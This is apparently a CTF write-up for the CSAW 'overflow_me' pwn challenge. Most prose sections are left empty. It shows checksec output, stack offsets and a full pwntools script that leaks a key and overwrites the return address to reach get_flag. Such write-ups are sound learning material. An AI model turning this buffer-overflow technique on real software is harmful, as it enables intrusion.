# overflow_me - CSAW
## Challenge Info
- Date: 2025
- CTF Name: CSAW
- Category: pwn
- Difficulty (subjective): easy
- Points: 477
- Provided Files: overflow_me(ELF)
- tools: 
## Brief Description
## Initial Analysis
### Environment
``` sh
checksec overflow_me
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```
### Code
## Vulnerability
## Exploit
### Strategy
### Exploitation Steps
### Stack Frame of main
| Variable Name | Offset from RBP |
| --- | --- |
| ra | 0x8 |
| rbp |  |
| addr | -0x8 |
| key | -0x10 |
| *fd | -0x18
### Stack Frame of get_input
| Variable Name | Offset from RBP |
| --- | --- |
| ra | 0x8 |
| rbp |  |
| fd | -0x8 |
| target | -0x10 |
| buf | -0x50 |
### payload
``` python
from pwn import *

p = remote('chals.ctf.csaw.io', 21006)
# p = process('./overflow_me')

# bof-1
secret_key_addr = 0x4040b8
p.sendafter(b'Your favorite book waits for you. Tell me its address', p64(secret_key_addr))
p.recvline()
secret_key = int(p.recvuntil('\n').decode().strip(), 16)
log.info(f'secret key: {secret_key:#x}')
p.sendafter(b'\nOf course there\'s a key. There always is. If you speak it, the story unlocks', p64(secret_key))

# bof-2
p.recvuntil(b'It has something for you: 0x')
val = int(p.recvline().decode().strip(), 16)
log.info(f'val: {val:#x}')
get_flag_addr = 0x0000000000401424
ret_addr = 0x000000000040101a
payload = b''
payload += b'A' * 0x40 # buf
payload += p64(val) # target
payload += b'B' * 0x8 # fd
payload += b'C' * 0x8 # rbp
payload += p64(ret_addr) # system's stack alignment
payload += p64(get_flag_addr) # ra
p.sendlineafter(b'Your turn now. Write yourself into this story.', payload)

# interactive
p.interactive() 
```
### PoC(Poof of Concept)
## Lessons Learned
## Mitigation Strategies(Remediation)